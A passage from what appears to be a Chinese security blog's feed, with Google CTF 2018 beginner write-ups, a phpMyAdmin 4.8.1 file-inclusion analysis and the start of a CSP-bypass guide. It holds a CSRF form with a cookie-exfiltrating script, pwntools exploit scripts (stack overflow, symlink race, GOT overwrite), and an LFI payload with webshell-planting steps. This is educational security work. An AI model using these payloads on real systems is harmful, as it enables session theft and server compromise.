Obsecurity(MISC)"></a>Security By Obsecurity(MISC)</h2><p>一道很猥琐的题目…… 通过file命令知道得到的文件是个zip压缩包，然后就开始了，一直解压解压解压。。。</p><p>最后拿到一个password的压缩包里面有个password.txt需要密码，看他题目中有提示john，暗示John The Ripper，这个暴力破解工具。</p><p>所以我们就暴力一下吧，我这里用的是ARCHPR</p><img src="/2018/07/18/google-ctf-beginner-part1/9.png"><p>得到密码asdf，解压得到password.txt</p><img src="/2018/07/18/google-ctf-beginner-part1/10.png"><p>拿到flag</p><h2 id="Router-UI-Web"><a href="#Router-UI-Web" class="headerlink" title="Router-UI(Web)"></a>Router-UI(Web)</h2><p>打开网站是一个登录页面，输入账号和密码之后，发现会显示在页面上，根据题目的提示，XSS无疑。我们输入script验证漏洞，结果被chrome的auditor拦截。GG，这里img，svg等等标签失去作用，就算用src=javascript:alert(1) 这样的形式也会变成500……</p><p>无奈之前，看了看别人的writeup，发现它们是利用了页面中的//分隔符，把script拆成了两个部分，这样就绕过了auditor的检查。</p><p>那么可以引入js执行了，怎么偷管理员的cookie呢？必须要让管理员用这样的username和password登录才行，所以就是CSRF了。</p><p>给管理员一个可以自动提交的网站，提交这些内容，就会触发js拿到cookie。代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"xxxxx/img/11.js&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"b"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"b"</span>).click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在11.js中，放入偷cookie的语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://xxxxxx/?c="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>这样在我们的服务器的日志中就可以看到带有cookie的请求了。但是由于比赛已经结束，估计机器人也没了，所以只能直接抄wp中的cookie进入后台。</p><img src="/2018/07/18/google-ctf-beginner-part1/11.png"><p>添加cookie之后，重新登录就会进入控制页面了</p><img src="/2018/07/18/google-ctf-beginner-part1/12.png"><p>最后在网页中找到flag</p><p>在XSS的构造中利用//来包含链接比较有意思，其他的就是中规中矩的CSRF+XSS的连锁。</p><h2 id="Message-of-the-day-PWN"><a href="#Message-of-the-day-PWN" class="headerlink" title="Message of the day(PWN)"></a>Message of the day(PWN)</h2><p>先按照国际惯例检查一下程序的安全保护。</p><img src="/2018/07/18/google-ctf-beginner-part1/13.png"><p>开启了NX意味着无法在内存中无法执行代码，所以这里就没有办法写shellcode执行拿权限。分析之后发现输入点处有不安全的gets函数，所以我们是可以栈溢出的。</p><img src="/2018/07/18/google-ctf-beginner-part1/14.png"><p>但是，没有办法写shellcode，那么还有什么办法可以拿到flag呢，在分析程序时看到在选项4中会有读取flag的操作，必须是管理员才能执行。</p><p>既然无法写shellcode，那么我们覆盖返回地址用ret2libc的思路去拿flag，应该是行的，我们知道读取flag的函数地址，只要把返回地址覆盖成这个地址即可。</p><p>src是一个0x100的栈，要栈溢出的话就要padding A*(0x100 + SP寄存器的大小)</p><img src="/2018/07/18/google-ctf-beginner-part1/15.png"><p>发现是RSP64位寄存器，那么我们最后的padding就是 A*(0x100+8)，地址我们也查到了是 00000000606063A5，所以最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"motd.competition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x108</span> + <span class="string">"\xA5\x63\x60\x60\x00\x00\x00\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行一下，拿到flag</p><img src="/2018/07/18/google-ctf-beginner-part1/16.png"><h2 id="Poetry-PWN"><a href="#Poetry-PWN" class="headerlink" title="Poetry(PWN)"></a>Poetry(PWN)</h2><p>有趣的一道题，开启了栈保护，所以栈溢出是不存在了。那么看看IDA中的内容。</p><img src="/2018/07/18/google-ctf-beginner-part1/17.png"><p>其中的LD_BIND_NOW 在网上查出来的结果，当这个变量设置为1的时候，会让连接器在程序执行前把所有的函数地址都连接好。</p><p>然后会用readlink读取 /proc/self/exe 就可以获取当前程序的绝对路径，之后设置 LD_BIND_NOW为1，再次执行该程序。</p><p>这里有个trick，就是如果在程序执行readlink(/proc/self/exe )的时候改变源程序，那么readlink得到的内容就会变成 原路径+” (deleted)”</p><p>所以只要我们在程序运行时对它做改动，它的readlink就会是另外一个名称，然后利用新的名称执行我们想要的命令。</p><p>由于我们的flag在其他用户的目录中，我们无法读取，所以思路就是改动程序让它执行我们控制好的其他程序读取flag，我们是没有权限的，但是poetry有这个权限。</p><p>这里，我们先用ln链接 poetry，得到一个我们自己的poetry，随后ln -s 硬链接cat 命名为 poetry(deleted)，这样我们在执行我们链接的poetry flag，然后删除我们的链接程序，就会触发cat 读取flag，整个过程都是poetry用户的权限，所以没问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"poetry.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"ln -s /bin/cat '/home/user/poetry (deleted)'\n"</span>)</span><br><span class="line">r.send(<span class="string">"ln /home/poetry/poetry /home/user/poetry\n"</span>)</span><br><span class="line">r.send(<span class="string">"(/home/user/poetry /home/poetry/flag &amp;);rm /home/user/poetry\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>最后这个脚本要多跑几次，因为这个是条件竞争的漏洞，最后通过这个flag了解到CVE-2009-1894，这个洞的触发条件就是在我们执行程序的时候，正好删除了原始链接程序，然后使得readlink返回我们伪造的程序路径从而执行恶意操作。</p><img src="/2018/07/18/google-ctf-beginner-part1/18.png"><p>拿到flag CVE链接 <code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</code></p><h2 id="Fridge-ToDo-List-PWN"><a href="#Fridge-ToDo-List-PWN" class="headerlink" title="Fridge ToDo List(PWN)"></a>Fridge ToDo List(PWN)</h2><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p><ol><li>打印列表</li><li>打印ToDo的任务</li><li>存储ToDo任务</li><li>删除ToDo任务</li><li>远程管理员</li><li>退出</li></ol><p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p><p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p><p>第五个查看源码就知道只是一个幌子。</p><p>第六个没啥好说的，退出操作。</p><p>看到第二个和第三个操作中都有同样的代码</p><img src="/2018/07/18/google-ctf-beginner-part1/19.png"><p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p><p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p><img src="/2018/07/18/google-ctf-beginner-part1/20.png"><p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p><p>之后该怎么利用呢？这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,system_addr)+<span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>之后执行命令，查看用户</p><img src="/2018/07/18/google-ctf-beginner-part1/21.png"><p>得到用户名，随后nc连上去，直接用该用户登录</p><img src="/2018/07/18/google-ctf-beginner-part1/22.png"><p>得到flag</p><p>这里要吐槽一点的是，这个泄露的libc一直没找到……，所以直接套用的其他人的exp。第一次感觉PWN也是蛮坑的。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。&lt;/p&gt;
&lt;h2 id=&quot;LETTER-MISC&quot;&gt;&lt;a href=&quot;#LETTER-MISC&quot; class
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner JS Safe 1 复现</title>
    <link href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/"/>
    <id>https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/</id>
    <published>2018-07-08T15:58:48.000Z</published>
    <updated>2018-07-19T01:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2018/07/08/google-ctf-beginner-js-safe-1/0.png"><h2 id="分析与操作"><a href="#分析与操作" class="headerlink" title="分析与操作"></a>分析与操作</h2><p>这道题有点high，作为一个JS调试新手，着实爽了一把。题目给了一个Html网页，里面有两段JS代码，看来是JS代码分析的题目。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/1.png"><p>我们先看其中的一段，前两个是解密用的参数，看到open_safe这个函数，password必须是CTF{xxxx}的格式，读取其中的数据代入判断。<br>if中把我们的输入代入了x函数。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/2.png"><p>我们的password会在env的g参数中被编码，a是读数组数据，b是创建函数，c是加操作，d是ascii码转换。</p><p>之后，根据code中的字母在env中操作属性。最后有个等待值更新的异步操作。<br>其中重点就是那个for循环对env的操作，但是代码这个又很难看懂…… 所以只能用console.log来dump出来看看细节。而我们想知道我们的password被用来干什么了。</p><p>在for循环中加上一些代码来锁定g参数的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="regexp">/g/</span>.test(code.substr(i,<span class="number">4</span>)))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="built_in">console</span>.log(code.substr(i,<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2018/07/08/google-ctf-beginner-js-safe-1/3.png"><p>定位在了876出现了g，然后看env里面有些啥。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/4.png"><p>有趣的东西，出现了之前js代码中的subtle，digst，sha-256，而且在最后的数组中是sha-256和我们的输入编码，这其实就可以推测这里是要对我们的输入计算sha-256hash。为了看更多细节，我们继续加入一些代码调试。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;=<span class="number">876</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + fn + <span class="string">"("</span> + arg1 + <span class="string">":"</span> +env[arg1] + <span class="string">","</span> + arg2 + <span class="string">":"</span> +env[arg2] + <span class="string">")"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + env[fn] + <span class="string">"("</span> + env[arg1] + <span class="string">","</span> + env[arg2] + <span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">980</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看这之间有什么操作</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/5.png"><p>果不其然，在876-884中完成了对我们输入的hash计算。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/6.png"><p>在940处，把我们计算出的hash变成数组，存入<code>env[Ѿ]</code>中。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/7.png"><p>可以很清楚的看到，在960取出了我们hash过后的第一个值，然后与230异或，异或后的值与h进行or操作后赋值给h，随后开始下一次循环。</p><p>从之前的js代码中的if就可以知道h必须为0才能跳过判断。所以异或的值必须为0，也就是说必须要和对应的值相同。这样我们就得到了一串hash计算后的数组 <code>230,104,96,84,111,24,205,187,205,134,179,94,24,181,37,191,252,103,247,114,198,80,206,223,227,255,122,0,38,250,29,238</code></p><p>最终我们把这串字符转16进制拼接得到 <code>e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee</code></p><p>这个是我们输入的字符的hash值，找个hash值破解网站，得到 Passw0rd! ，所以最终flag为<code>CTF{Passw0rd!}</code></p><p>至于剩下的代码，它是用于解密数据的，我们输入正确就会解密成功，输出是下一题的入口。感觉是一道题被拆分成了几块……</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较基础但是又很考察基本功的题，从中学习到了很多。</p><p>最后我想说一下的是那个SubtleCrypto.digest()方法我一开始没怎么搞懂，他是怎么把utf-8的编码数组hash计算的。之后找到了它的实现原理，所以也就懂了，为什么要一开始先utf-8编码才进行hash计算。</p><p><code>https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest</code></p><p>经过这次JS分析，感觉学习专门的JS调试迫在眉睫…… ，有变量监听和事件监听，会给调试工作带来很大便利。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/JS%20safe</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1 后台LFI</title>
    <link href="https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/"/>
    <id>https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/</id>
    <published>2018-07-01T13:02:15.000Z</published>
    <updated>2018-08-14T16:34:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前ChaMd5团队报出来的phpmyadmin的文件包含漏洞，今天就来分析复现一下。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/1.png"><p>漏洞的输入点是 <code>include $_REQUEST[&#39;target&#39;];</code>出现了文件包含这种危险操作，那么有很大概率出现问题。</p><p>我们只要绕过57、58、59行的检测就可以成功控制包含文件。</p><p>第57行用正则匹配开头为index的路径，只要路径开头没有index即可。</p><p>第58行检索输入中是否有黑名单的字符，黑名单在第50行，可以看到 import.php和export.php，只要参数中没这两个php就行。</p><p>第59行要看Core类的方法checkPageValidity。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/2.png"><p>第452行的第三个if判断，检查了输入中的白名单，如果有这些php就直接返回true。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/3.png"><p>没什么用，继续看下面的操作。mb_substr截取字符串从开始的位置到?处的字符串，再次检索白名单。</p><p>虽然可以在url中加入?来通过这个判断，但是随后的include因为有?，所以就无法包含我们控制的文件。</p><p>之后，重点来了，在465行出现了一个url解码操作。由于这里解码之后又重复了一遍上面的截取操作，所以这里我们就可以让?编码两次来绕过白名单检测，之后返回到include的时候也能包含我们想要的文件。最后的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../tongfang.txt</span><br></pre></td></tr></table></figure><p>db_sql.php是白名单中的一个，然后用两次URl编码过的?截断，两次URL编码的?在php的urldecode后会变成?，从而绕过检测，之后include文件时，服务器会认为db_sql.php%3f是一个目录，然后包含最后的文件。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/4.png"><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>利用创建新的表，在表的字段中放入Webshell，然后包含数据库文件</li><li>执行<code>SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;</code>,然后包含php的session文件</li></ol><p>推荐用第二种方法更加隐蔽并且不需要猜测数据库文件路径，效果如下：</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/5.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说这个漏洞需要在登录phpmyadmin之后才能利用，所以只要密码强度够，暂时就不会有太大危险，但还是推荐尽快升级。另外如果是在session中写了Webshell，用菜刀连的时候必须要有phpmyadmin的session才行……</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=23&amp;srcid=0701Pk3Qg7hDrUSsZWD5dffq#rd" target="_blank" rel="noopener">ChaMd5的文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前ChaMd5团队报出来的phpmyadmin的文件包含漏洞，今天就来分析复现一下。&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;img src=&quot;/2018/07/01/
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CSP绕过总结</title>
    <link href="https://hurricane618.me/2018/06/30/csp-bypass-summary/"/>
    <id>https://hurricane618.me/2018/06/30/csp-bypass-summary/</id>
    <published>2018-06-30T03:33:01.000Z</published>
    <updated>2018-08-14T16:35:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>首发在信安之路上 <a href="https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ</a> ，之后文章略有修改。</p><h1 id="CSP绕过总结"><a href="#CSP绕过总结" class="headerlink" title="CSP绕过总结"></a>CSP绕过总结</h1><p>今年的0CTF预选赛6道web题，其中三道都涉及CSP的知识点，简直可怕。。。这次趁着空闲时间就稍稍总结一下CSP绕过方面的知识，无论是对以后CTF比赛还是工作都很有帮助。</p><h2 id="CSP的基础"><a href="#CSP的基础" class="headerlink" title="CSP的基础"></a>CSP的基础</h2><p>CSP的全称Content Security Policy，用来防御XSS攻击的技术。它是一种由开发者定义的安全性政策性申明，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</p><p>一个CSP头由多组CSP策略组成，中间由分号分隔,如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure><p>其中每一组策略包含一个策略指令和一个内容源列表。策略指令有如下选项：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 \&lt;audio>、\&lt;video> 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 \&lt;applet>、\&lt;embed>、\&lt;object> 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><p>内容源有如下选项：</p><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>允许加载foo.com子域的资源</td></tr><tr><td>abc.foo.com</td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com" target="_blank" rel="noopener">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的\&lt;script>元素、javascript: URL、内联的事件处理函数和内联的\&lt;style>元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><p>内容源有三种：源列表、关键字和数据，其中<em>，</em>.foo.com，abc.foo.com，<a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> ，https:属于源列表。’none’，’self’，’unsafe-inline’，’unsafe-eval’属于关键字。data:，mediastream:属于数据。</p><p>例子1</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>意思就是默认的内容源必须为同源或者是 trustedscripts.foo.com</p><p>例子2</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src 'self' data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>图片源可以为同源内容或者是data:引用的资源，媒体源必须使用mediastream:引用，除此以外的都执行默认内容源判断，必须为同源内容。更加详细的可以看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>一个在线的CSP头部生成器可以帮助我们深入理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>一个CSP安全检测网站，能够提供一些参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure><h2 id="CSP的进化–nonce-script-CSP和strict-dynamic"><a href="#CSP的进化–nonce-script-CSP和strict-dynamic" class="headerlink" title="CSP的进化–nonce script CSP和strict-dynamic"></a>CSP的进化–nonce script CSP和strict-dynamic</h2><p>这是Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p><h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 